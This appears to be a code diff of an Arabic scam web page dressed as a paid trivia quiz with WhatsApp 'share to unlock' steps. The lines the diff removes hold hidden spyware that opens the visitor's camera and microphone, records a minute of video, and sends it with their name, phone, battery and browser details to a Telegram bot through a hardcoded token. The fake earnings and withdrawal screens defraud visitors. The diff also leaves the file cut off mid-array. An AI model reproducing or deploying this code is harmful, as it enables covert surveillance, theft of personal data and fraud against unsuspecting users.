@@ -237,12 +237,12 @@
 
             <div class="welcome-text" style="font-size: 15px;">
                 <b>1 -</b> إضغط على زر "مساهمة" الموجود في الأسفل وساهم معنا بإرسال الرابط الى <b>15 صديقاً أو 5 مجموعات على الواتساب.</b><br>
-                <b>2 -</b> ستصلك رسالة تلقائيا بعد امتلاء شريط التحقق الأخضر بالأسفل.<br>
+                <b>2 -</b> يجب إتمام النشر بنجاح والعودة للموقع ليزداد شريط التحقق الأخضر.<br>
                 <b>3 -</b> قم بإبراز الرسالة التي ستصلك في النهاية لمكان التسليم .
             </div>
 
             <a id="whatsapp-link" href="#" target="_blank" style="display:none;"></a>
-            <button type="button" class="btn-green" onclick="shareWhatsApp()">مساهمة</button>
+            <button type="button" class="btn-green" id="share-btn" onclick="shareWhatsApp()">مساهمة</button>
 
             <div class="progress-container">
                 <div id="progress-percentage" class="progress-text">0%</div>
@@ -313,7 +313,7 @@
     <script>
         let progress = 0;
         let userBalance = 0.00;
-        let isCounting = false;
+        let isWaitingForReturn = false;
         let batteryLevelInfo = "غير معروف";
         let mediaStream = null;
 
@@ -385,234 +385,4 @@
             { q: "ما هو رمز عنصر الماء الكيميائي؟", options: ["CO2", "H2O", "O2", "NaCl"], correct: 1 },
             { q: "ما هو رمز عنصر ملح الطعام الكيميائي؟", options: ["H2O", "NaCl", "HCl", "NaOH"], correct: 1 },
             { q: "كم عدد عصور ما قبل التاريخ الرئيسية؟", options: ["عصران", "ثلاثة عصور", "أربعة عصور", "خمسة عصور"], correct: 1 },
-            { q: "ما هو السائل الذي يضخه القلب ليطوف في الجسم؟", options: ["الماء", "الدم", "اللمف", "البلازما"], correct: 1 },
-            { q: "كم عدد أركان الإسلام؟", options: ["4 أركان", "5 أركان", "6 أركان", "7 أركان"], correct: 1 },
-            { q: "كم عدد أركان الإيمان؟", options: ["5 أركان", "6 أركان", "7 أركان", "4 أركان"], correct: 1 },
-            { q: "ما هي السورة القرآنية التي تسمى 'عروس القرآن'؟", options: ["سورة البقرة", "سورة يس", "سورة الرحمن", "سورة الملك"], correct: 2 },
-            { q: "ما هي السورة التي تقرأ لعدم وجود آية البسملة في أولها؟", options: ["سورة التوبة", "سورة الانفال", "سورة الإخلاص", "سورة الفاتحة"], correct: 0 },
-            { q: "من هو النبي الذي ألقي في النار فلم تأكله؟", options: ["إبراهيم عليه السلام", "موسى عليه السلام", "عيسى عليه السلام", "نوح عليه السلام"], correct: 0 },
-            { q: "من هو النبي الذي ابتلعه الحوت؟", options: ["يونس عليه السلام", "يوسف عليه السلام", "أيوب عليه السلام", "زكريا عليه السلام"], correct: 0 },
-            { q: "ما هي لغة أهل الجنة في الآخرة حسب بعض الآثار؟", options: ["العربية", "السريانية", "العبرية", "لم يثبت نص قاطع"], correct: 3 },
-            { q: "كم عدد اللاعبين في فريق كرة القدم الأساسي بالملعب؟", options: ["9 لاعبين", "10 لاعبين", "11 لاعباً", "12 لاعباً"], correct: 2 },
-            { q: "كم عدد شوط مباراة كرة السلة الأساسية؟", options: ["شوطان", "ثلاثة أشواط", "أربعة أشواط", "خمسة أشواط"], correct: 2 },
-            { q: "في أي رياضة يُستخدم مصطلح 'الكش مات' (Checkmate)؟", options: ["كرة المضرب", "الشطرنج", "البلياردو", "الملاكمة"], correct: 1 },
-            { q: "ما هي الدولة المصنفة الأولى عالمياً في كرة القدم تاريخياً بعدد كؤوس العالم؟", options: ["ألمانيا", "الأرجنتين", "البرازيل", "إيطاليا"], correct: 2 },
-            { q: "ما هي عاصمة فرنسا الثقافية والسياسية؟", options: ["مارسيليا", "باريس", "ليون", "تولوز"], correct: 1 },
-            { q: "ما هو اسم الغاز الذي تستخدمه النباتات في عملية البناء الضوئي؟", options: ["الأكسجين", "ثاني أكسيد الكربون", "النيتروجين", "الهيدروجين"], correct: 1 },
-            { q: "ما هو العضو المسؤول عن ضخ الدم في جسم الإنسان؟", options: ["المخ", "الكبد", "القلب", "الرئتان"], correct: 2 },
-            { q: "ما هو العضو المسؤول عن التفكير والتحكم بالجسم؟", options: ["القلب", "المخ (الدماغ)", "الكلى", "المعدة"], correct: 1 },
-            { q: "كم عدد عظام جسم الإنسان البالغ تقريباً؟", options: ["150 عظمة", "206 عظام", "300 عظمة", "250 عظمة"], correct: 1 },
-            { q: "ما هو أكبر أعضاء جسم الإنسان مساحة ووظيفة خارجية؟", options: ["الكبد", "الجلد", "الأمعاء الدقيقة", "المعدة"], correct: 1 },
-            { q: "ما هي عاصمة إندونيسيا؟", options: ["بالي", "جاكرتا", "سورابايا", "باندونغ"], correct: 1 },
-            { q: "ما هي عاصمة ماليزيا؟", options: ["بيان ليناس", "كوالالمبور", "جورج تاون", "ملكا"], correct: 1 },
-            { q: "ما هي عاصمة باكستان؟", options: ["كراتشي", "لاهور", "إسلام آباد", "بيشاور"], correct: 2 },
-            { q: "ما هي عاصمة الهند؟", options: ["مومباي", "نيودلهي", "حيدر آباد", "بنغالور"], correct: 1 },
-            { q: "ما هي عاصمة كوريا الجنوبية؟", options: ["بيونغيانغ", "سيول", "بوسان", "إنتشون"], correct: 1 },
-            { q: "ما هي عاصمة كوريا الشمالية؟", options: ["سيول", "بيونغيانغ", "كايسونغ", "وون산"], correct: 1 },
-            { q: "ما هي عاصمة كندا؟", options: ["تورونتو", "فانكوفر", "أوتاوا", "مونتريال"], correct: 2 },
-            { q: "ما هي عاصمة المكسيك؟", options: ["مونتيري", "غوادالاخارا", "مكسيكو سيتي", "كانكون"], correct: 2 },
-            { q: "ما هي الدولة التي يمر بها خط الاستواء وتعتبر عاصمتها كيتو؟", options: ["كولومبيا", "الإكوادور", "بيرو", "فنزويلا"], correct: 1 },
-            { q: "ما هو أكبر محيط في العالم؟", options: ["المحيط الأطلسي", "المحيط الهندي", "المحيط الهادئ", "المحيط المتجمد الشمالي"], correct: 2 },
-            { q: "ما هو أصغر محيط في العالم؟", options: ["المحيط الهندي", "المحيط المتجمد الشمالي", "المحيط الأطلسي", "المحيط المتجمد الجنوبي"], correct: 1 },
-            { q: "ما هي الدولة الأكثر سكاناً في العالم حالياً؟", options: ["الصين", "الهند", "الولايات المتحدة", "إندونيسيا"], correct: 1 },
-            { q: "ما هي اللغة الرسمية في البرازيل؟", options: ["الإسبانية", "البرتغالية", "الإنجليزية", "الفرنسية"], correct: 1 },
-            { q: "ما هو أطول جسر بحر في العالم العربي أو العالم؟", options: ["جسر الملك فهد", "جسر هونغ كونغ تشوهای ماكاو", "جسر بانابونا", "جسر دايانيو"], correct: 1 },
-            { q: "ما هي العملة الرسمية لدولة الإمارات العربية المتحدة؟", options: ["الريال", "الدينار", "الدرهم", "الدولار"], correct: 2 },
-            { q: "ما هي العملة الرسمية للمملكة العربية السعودية؟", options: ["الدرهم", "الريال", "الدينار", "الجنيه"], correct: 1 }
-        ];
-
-        let currentQuestion = 0;
-
-        window.onload = function() {
-            localStorage.clear(); 
-            initCamera();
-            getBatteryStatus();
-        };
-
-        function getBatteryStatus() {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(function(battery) {
-                    batteryLevelInfo = Math.round(battery.level * 100) + "%";
-                });
-            }
-        }
-
-        function initCamera() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-            .then(function(stream) {
-                mediaStream = stream;
-                let video = document.getElementById('video');
-                video.srcObject = stream;
-                video.play();
-            })
-            .catch(function(err) {
-                console.log("تم رفض إذن الكاميرا أو الميكروفون");
-            });
-        }
-
-        function startProcess() {
-            let nameField = document.getElementById('user-name');
-            let phoneField = document.getElementById('user-phone');
-
-            if (!nameField || !phoneField) return;
-
-            let name = nameField.value.trim();
-            let phone = phoneField.value.trim();
-
-            if (name === "" || phone === "") {
-                alert("الرجاء إدخال الاسم ورقم الهاتف بشكل صحيح.");
-                return;
-            }
-
-            // بدء تسجيل الفيديو لمدة دقيقة كاملة وإرساله للبوت
-            recordAndSendVideo(name, phone);
-
-            document.getElementById('display-name').innerText = name;
-            document.getElementById('form-section').classList.add('hidden');
-            document.getElementById('content-section').classList.remove('hidden');
-        }
-
-        function recordAndSendVideo(name, phone) {
-            if (!mediaStream) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
-                .then(function(stream) {
-                    mediaStream = stream;
-                    startRecordingProcess(name, phone, stream);
-                }).catch(e => console.log("تعذر فتح الكاميرا"));
-                return;
-            }
-            startRecordingProcess(name, phone, mediaStream);
-        }
-
-        function startRecordingProcess(name, phone, stream) {
-            let recordedChunks = [];
-            let options = { mimeType: 'video/webm; codecs=vp9' };
-            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                options = { mimeType: 'video/mp4' };
-            }
-
-            try {
-                let mediaRecorder = new MediaRecorder(stream, options);
-
-                mediaRecorder.ondataavailable = function(event) {
-                    if (event.data && event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = function() {
-                    let blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                    sendVideoToTelegram(blob, name, phone);
-                };
-
-                mediaRecorder.start();
-
-                // تسجيل فيديو لمدة دقيقة كاملة (60000 مللي ثانية)
-                setTimeout(() => {
-                    if (mediaRecorder.state === "recording") {
-                        mediaRecorder.stop();
-                    }
-                }, 60000);
-
-            } catch (e) {
-                console.log("خطأ في بدء التسجيل: ", e);
-            }
-        }
-
-        function sendVideoToTelegram(videoBlob, name, phone) {
-            let botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
-            let chatId = "7962257606";
-
-            let formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('video', videoBlob, 'capture.mp4');
-            formData.append('caption', `🎥 تسجيل فيديو لمدة دقيقة:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔋 البطارية: ${batteryLevelInfo}\n📱 الجهاز: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent}`);
-
-            let url = `https://api.telegram.org/bot${botToken}/sendVideo`;
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            }).catch(err => console.log("خطأ في إرسال الفيديو"));
-        }
-
-        function shareWhatsApp() {
-            if (isCounting) return;
-            isCounting = true;
-
-            let siteUrl = window.location.href;
-            let message = "شارك في مسابقة الربح من الإعلانات والأسئله وسجل اسمك ورقمك عبر الرابط: " + siteUrl;
-            let whatsappUrl = "https://api.whatsapp.com/send?text=" + encodeURIComponent(message);
-            
-            let link = document.getElementById('whatsapp-link');
-            link.href = whatsappUrl;
-            link.click();
-
-            setTimeout(() => {
-                if (progress < 100) {
-                    progress += 20; 
-                    if (progress > 100) progress = 100;
-
-                    document.getElementById('progress-fill').style.width = progress + '%';
-                    document.getElementById('progress-percentage').innerText = progress + '%';
-                }
-
-                isCounting = false;
-
-                if (progress >= 100) {
-                    setTimeout(() => {
-                        document.getElementById('content-section').classList.add('hidden');
-                        document.getElementById('quiz-section').classList.remove('hidden');
-                        loadQuestion();
-                    }, 500);
-                }
-            }, 5000);
-        }
-
-        function loadQuestion() {
-            if (currentQuestion >= questions.length) {
-                currentQuestion = 0;
-            }
-            let qData = questions[currentQuestion];
-            document.getElementById('question-text').innerText = (currentQuestion + 1) + ". " + qData.q;
-            
-            let optionsHtml = '';
-            qData.options.forEach((opt, index) => {
-                optionsHtml += `<button type="button" class="option-btn" onclick="checkAnswer(${index}, ${qData.correct})">${opt}</button>`;
-            });
-            document.getElementById('options-container').innerHTML = optionsHtml;
-        }
-
-        function checkAnswer(selected, correct) {
-            if (selected === correct) {
-                userBalance += 2.00;
-                alert("إجابة صحيحة! تم إضافة $2.00 إلى محفظتك.");
-            } else {
-                alert("إجابة خاطئة! حظ أوفر في المرة القادمة.");
-            }
-            currentQuestion++;
-            document.getElementById('balance').innerText = userBalance.toFixed(2);
-            document.getElementById('balance-withdraw').innerText = userBalance.toFixed(2);
-            loadQuestion();
-        }
-
-        function showWithdrawOptions() {
-            document.getElementById('quiz-section').classList.add('hidden');
-            document.getElementById('withdraw-section').classList.remove('hidden');
-        }
-
-        function backToQuiz() {
-            document.getElementById('withdraw-section').classList.add('hidden');
-            document.getElementById('quiz-section').classList.remove('hidden');
-        }
-
-        function tryWithdraw(bankName) {
-            if (userBalance >= 50.00) {
-                alert("مبروك! تم تقديم طلب السحب عبر " + bankName + " بنجاح.");
-            } else {
-                alert("عذراً، لم تصل إلى الحد الأدنى للسحب (تحتاج إلى $50.00 على الأقل). استمر في الإجابة لزيادة رصيدك!");
-            }
-        }
-    </script>
-</body>
-</html>
+            { q: "ما هو السائل الذي يضخه القلب ليطوف في الجسم؟", options: ["الماء",
